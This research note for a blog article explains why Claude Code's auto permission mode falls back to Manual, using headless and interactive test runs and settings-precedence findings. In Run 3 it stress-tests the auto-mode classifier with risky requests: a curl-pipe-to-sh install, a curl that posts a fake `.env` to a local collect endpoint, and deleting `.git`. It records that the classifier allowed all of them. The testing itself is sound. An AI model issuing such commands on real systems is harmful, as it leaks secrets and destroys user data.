# Why Claude Code auto mode doesn't turn on, and how to tell which cause is yours

Research note for the loopnotes.dev article on Claude Code auto mode not working. The question: you asked for auto mode (a flag, a settings file, or the built-in default) and the session runs in Manual or keeps asking. What decides that, what does each cause look like on screen, and what fixes it? All runs were made on one Linux machine with Claude Code 2.1.326 on 2026-11-17.

## Conclusions

- Read the line under the input box before adding more settings: in an interactive session it names the mode you really got, and a different mode name there means some other `defaultMode` line is winning, not that auto is broken (Run 2, Run 2b).
- Shift+Tab separates two causes by their text: an unsupported model shows `auto mode unavailable for this model` once the cycle passes where auto would be, and a `disableAutoMode` setting shows `auto mode disabled by settings` from the start; in both, auto is missing from the cycle, so the fix is to switch model or remove that setting (Run 2).
- Headless `claude -p` runs show no text at all: a project-file `auto`, an unsupported model and `disableAutoMode` all end in a quiet `default`, so a script or CI run has to read `permissionMode` in the first `init` event (Run 1).
- `defaultMode: "auto"` in `.claude/settings.json` or `.claude/settings.local.json` took effect in interactive sessions here but was ignored by `-p` runs, which then also lost the user-level default; for scripts and CI, put `auto` in `~/.claude/settings.json` (or pass the flag), which worked in both (Run 1, Run 2, Run 2b).
- The `/status` "Auto mode server" line did not tell whether auto was available on this machine, so do not use it as the check (Run 2).
- Four explicit risky requests in auto mode were all allowed, so the fallback to prompting (3 blocks in a row or 20 in a session) could not be produced here; it is stated from the official page only (Run 3).

## Run 1: where a request for auto mode sticks (2026-11-17, Linux, Claude Code 2.1.326)

Method: each case is a fresh empty git repo with its own `.claude/` folder. One headless call per case:
`claude -p "Reply with the single word ok." --output-format stream-json --verbose --max-turns 1 [case args]`.
The mode the session really got is read from the `permissionMode` field of the `system/init` event (and of `system/status` when one is emitted). The user-level settings file on this machine sets `defaultMode` to `bypassPermissions`; it was not changed for the test. One run per case.

| Case | How auto was asked for | Model | Mode the session got | Any warning? |
|---|---|---|---|---|
| flag | `--permission-mode auto` | Haiku 5.5 | `auto` | none |
| none | nothing (control) | Haiku 5.5 | `bypassPermissions` (the user-level default) | none |
| project settings | `.claude/settings.json` `defaultMode: "auto"` | Haiku 5.5 | `default` (Manual) | none |
| local settings | `.claude/settings.local.json` `defaultMode: "auto"` | Haiku 5.5 | `default` (Manual) | none |
| older model | `--permission-mode auto` | Haiku 4.5 | `default` (Manual) | none (a `status` event repeats `default`) |
| turned off in project | `--permission-mode auto` + project `disableAutoMode: "disable"` | Haiku 5.5 | `default` (Manual) | none (a `status` event repeats `default`) |

All six calls answered "ok" with result `success`. Every case where auto did not take effect fell back to Manual and carried on without an error on stderr.

What it concludes:
- Four different reasons (project file, local file, unsupported model, a `disableAutoMode` setting) look the same in headless output: the session runs in Manual and nothing says why (the interactive screen does show text for two of them, see Run 2).
- `defaultMode: "auto"` in a project-level file does not just fail; it also stops the user-level `defaultMode` from applying (control run got `bypassPermissions`, project-file run got `default`). This matches the official permission-modes page.
- Headless output shows the real mode in the first `init` event, so one command tells the reader which mode they are in.

## Run 2: the same causes in an interactive session (2026-11-17, Linux, Claude Code 2.1.326)

Method: the same kinds of fresh repos, but an interactive `claude` session driven through a pseudo-terminal (150x50) with the parent session's `CLAUDE*`/`ANTHROPIC*` environment variables removed, so it starts like a new terminal. The folder-trust prompt was accepted. For each case: screen read about 12 s after start, then `/status`, then Shift+Tab five times with the screen read after each press. Screens (account, paths and session IDs removed) are in `run2-screens/`.

| Case | Status line at start | Shift+Tab cycle | Text shown | `/status` "Auto mode server" |
|---|---|---|---|---|
| control: no flag, no project file (user default `bypassPermissions`) | `bypass permissions on` | auto → manual → accept edits → plan → bypass | none | Disabled |
| flag `--permission-mode auto`, Haiku 5.5 | `auto mode on` | manual → accept edits → plan → auto | none | Enabled |
| project `.claude/settings.json` `defaultMode: "auto"` (Haiku 5.5; repeated on a second fresh repo and once with the default Sonnet 5.5) | `auto mode on` (all 3) | manual → accept edits → plan → auto | none | Enabled |
| project `.claude/settings.local.json` `defaultMode: "auto"` | `auto mode on` | manual → accept edits → plan → auto | none | Enabled |
| flag + Haiku 4.5 at start | `manual mode on` | accept edits → plan → manual (auto skipped) | `auto mode unavailable for this model` appears at the right once the cycle passes where auto would be; nothing at start | Disabled |
| flag + project `disableAutoMode: "disable"` | `manual mode on` | accept edits → plan → manual (auto skipped) | `auto mode disabled by settings` already on screen at start, stays while cycling | Disabled |
| flag, Haiku 5.5, then `/model claude-haiku-4-5` mid-session | `auto mode on`, then `manual mode on` right after the switch | accept edits → plan → manual (auto skipped) | `auto mode unavailable for this model` right after the switch | (not opened) |

Side effect to know: `/model <name>` in 2.1.326 printed "Set model to Haiku 4.5 and saved as your default for new sessions" and wrote the model into the user settings file. It was set back by hand right after the run.

What it concludes:
- **The project-file case splits by how you run Claude Code.** Interactive sessions on this machine started in auto from `defaultMode: "auto"` in `.claude/settings.json` or `.claude/settings.local.json` (4 of 4 runs), and over a user default of `bypassPermissions`. Headless `-p` runs in the same folders got `default` (Run 1, and 3 more headless runs today, including one in a folder already trusted interactively). The official page says the project-level line is ignored; in 2.1.326 that held for `-p` only. So the "move it to `~/.claude/settings.json`" fix is what a script or CI run needs; an interactive user with the line in a project file already gets auto.
- **Shift+Tab does tell two causes apart.** When the model is unsupported or a setting turns auto off, auto is dropped from the cycle and a reason appears at the right of the input box: `auto mode unavailable for this model` (only once you cycle, or right after `/model`) or `auto mode disabled by settings` (from the start). Headless output shows neither text, only `default` in `init`.
- `/status` "Auto mode server" read Enabled only in sessions that were in auto when it was opened and Disabled in the control session, which could still cycle into auto. On this machine it did not work as a check for whether auto is available, so the article does not use it as one. (In one earlier run that inherited the parent session's environment it read Disabled while the session was in auto.)

## Run 2b: auto in the user settings file (2026-11-17)

`~/.claude/settings.json` was copied, `permissions.defaultMode` set to `"auto"`, four runs made, then the copy restored (file hash identical before and after) and a control run made.

| Case | Mode |
|---|---|
| headless, no flag | `auto` |
| headless, user `auto` + project `defaultMode: "auto"` | `auto` |
| interactive, no flag | `auto mode on` |
| interactive, user `auto` + project `defaultMode: "auto"` | `auto mode on` |
| after restore: headless control | `bypassPermissions` (restored) |

What it concludes: the user-level file works for both headless and interactive, and a project-level `auto` line does not pull a headless run down to `default` when the user file already says `auto`.

## Run 3: trying to trigger the classifier fallback (2026-11-17)

Method: interactive session, `--permission-mode auto`, Haiku 5.5, in a throwaway repo with a local bare repo as `origin`, a fake `.env` (`API_KEY=fake-not-a-real-key`), a two-line `install.sh` and a fake `.bashrc` in a scratch folder. Four requests in a row, 75 s apart:

1. Force-push `HEAD~1` to `origin/main`: Claude checked the remote, saw nothing to discard and did not push; it asked which push I meant. Not a classifier block, the model chose not to.
2. `curl -fsSL file://…/install.sh | sh`: Claude read the script first, then ran the pipe. Allowed.
3. `curl -d @.env http://127.0.0.1:9/collect`: allowed; curl failed to connect (nothing listening) and Claude added a note against sending keys in a request body.
4. Append a line to the fake `.bashrc` and delete the repo's `.git`: allowed; Claude copied `.git` to a backup first.

The status line read `auto mode on` after every request. No action was blocked, so no fallback to prompting happened, and the 3-in-a-row / 20-total rule could not be observed here. When the user explicitly asks for the action, the classifier let these through. Nothing outside the scratch folder changed (the real `~/.bashrc` was checked).

What it concludes: on this machine the fallback could not be produced on purpose with explicit requests; the article states the rule from the official page and does not claim an observed fallback.

## Official sources

- [Choose a permission mode](https://code.claude.com/docs/en/permission-modes), read 2026-11-17: requirements (all plans; Team/Enterprise admins can set `permissions.disableAutoMode`; supported models per provider, Sonnet 4.5 / Opus 4.5 / Haiku 4.5 not supported), built-in starting mode with v2.1.283+, `defaultMode: "auto"` ignored in `.claude/settings.json` and `.claude/settings.local.json` (move it to `~/.claude/settings.json`), unavailable auto starts in Manual, server-side off keeps auto off until the session ends, fallback after 3 blocks in a row or 20 total (not configurable), `-p` runs keep working without the blocked action.

## Other people's reports (links only, not used as causes)

GitHub issues on anthropics/claude-code, as listed in the research brief: each is one person's case.

- [#62849](https://github.com/anthropics/claude-code/issues/62849): auto not shown in the Shift+Tab cycle.
- [#43235](https://github.com/anthropics/claude-code/issues/43235): auto does nothing on Haiku, with no feedback.
- [#41077](https://github.com/anthropics/claude-code/issues/41077), [#87534](https://github.com/anthropics/claude-code/issues/87534): "unavailable for your plan" message.
- [#44818](https://github.com/anthropics/claude-code/issues/44818): auto turned off after managed settings were deployed.
- [claudefa.st auto mode guide](https://claudefa.st/blog/guide/development/auto-mode): long explainer; its plan and model details date from 2026-04 and differ from the current official page.

## Limits

- One machine (Linux), one version (2.1.326), one account, mostly one run per case (the interactive project-file case was run 4 times, the headless project-file case 4 times). Model support and default behaviour change between versions.
- The user-level settings file had `defaultMode: "bypassPermissions"` for every run except Run 2b; results with no user default may differ.
- Not reproduced: managed (admin) settings, the server-side switch-off, the "unavailable for your plan" message, VS Code and the desktop app. Those are stated from the official page only, or not at all.
- The classifier fallback was not observed (Run 3).

## Added at reader fix r1 (2026-11-17)

- Update commands, from [Advanced setup](https://code.claude.com/docs/en/setup) (read 2026-11-17): native installs update in the background and `claude update` applies one now; Homebrew does not auto-update (`brew upgrade claude-code` or `brew upgrade claude-code@latest`, by cask); npm upgrades with `npm install -g @anthropic-ai/claude-code@latest` (the page warns against `npm update -g`). Version check: `claude --version`.
- Server-side switch, from [Choose a permission mode](https://code.claude.com/docs/en/permission-modes) (read 2026-11-17): Anthropic may turn auto off server-side ("temporarily") or the server may reject auto for the account; a session that got either answer keeps auto off until it ends, "so start a new session later". The page gives no time frame and does not promise a new session restores auto.
- Version thresholds kept out of the body: v2.1.302 (`-p` starts in Manual unless a flag or user settings give a mode). v2.1.283 (auto is the starting mode on every plan) stays in the body only as the line below which "unavailable for your plan" means update first.
- The "unavailable for your plan" GitHub reports (#41077 on v2.1.86, #87534 on 2.1.141, gone after updating) are why the body treats that message as an old build; the body no longer cites them in prose.

## Added at reader fix r2 (2026-11-17)

- Scene details moved out of the body (author interview): the team repo was another team's settlement batch repo, joined this summer; its committed `.claude/settings.json` also had two deny lines on the migrations folder. The blocked `curl | sh` install happened about an hour into Auto in a personal VS Code window while adding a linter to a small Python repo. In the Haiku 4.5 session the "unavailable for this model" text appeared at the third Shift+Tab.
- Headless runs (project-file auto, Haiku 4.5, `disableAutoMode`): each ran as `default` (Manual), finished with result `success`, and wrote nothing to stderr.
- Settings search: `grep -nsE '"(defaultMode|disableAutoMode)"' .claude/settings.local.json .claude/settings.json ~/.claude/settings.json` checked on this machine 2026-11-17 against a scratch project with `defaultMode` and `disableAutoMode` lines (finds both, `-s` hides missing-file warnings).
- Managed settings, from [Settings files and precedence](https://code.claude.com/docs/en/settings) and [Deploy managed settings](https://code.claude.com/docs/en/managed-settings) (read 2026-11-17): managed settings sit above command line, project local, shared project and user; `permissions.defaultMode` is a key managed sources can set (read from the highest-ranked managed source only); `/status` shows a `Setting sources` line naming the managed source; file-based policy paths `/Library/Application Support/ClaudeCode/managed-settings.json` (macOS), `/etc/claude-code/managed-settings.json` (Linux and WSL), `C:\Program Files\ClaudeCode\managed-settings.json` (Windows); server-managed settings come from the claude.ai admin console with no local file. The settings page also says `/model` saves the model as the default for new sessions (so the body no longer ties that to 2.1.326).

## Added at reader fix r3 (2026-11-17)

- Moved out of the body: Interactive runs on 2.1.326 kept a project-level or local `"auto"` (4 of 4), while [Choose a permission mode](https://code.claude.com/docs/en/permission-modes) says both files are ignored; only `-p` runs matched the docs (Run 1, Run 2). The body now keeps only the conclusion: the user file (or the flag) is the one place that holds in both.
- Moved out of the body: file-based managed-settings paths (macOS, Linux/WSL, Windows; listed under "Added at reader fix r2"). The body keeps `/status` → `Setting sources` as the check, since a reader can't edit that file.
- Headless `init` event, checked on this machine 2026-11-17 (Claude Code 2.1.326, scratch git repo, user settings with SessionStart hooks): `claude -p "Reply with the single word ok." --output-format stream-json --verbose --max-turns 1` emitted 6 events in this order: `system/hook_started`, `system/hook_response`, `system/init`, `assistant`, `rate_limit_event`, then the result. So `head -1` returns a hook event, not `init`, whenever hooks are configured. `jq -r 'select(.type=="system" and .subtype=="init") | .permissionMode'` printed `bypassPermissions` (this machine's user default); `grep -o '"permissionMode":"[^"]*"' | head -1` printed the same value (hook events carry no `permissionMode`).
- Gitignore check: `git check-ignore -v .claude/settings.local.json` printed the matching rule (here `**/.claude/settings.local.json` from the user's global git ignore file) with exit 0; with that global file disabled it printed nothing and exited 1. Checked on this machine 2026-11-17.

Article: [Claude Code Auto Mode Not Working: Check the Real Mode First](https://loopnotes.dev/claude-code-auto-mode-not-working/)
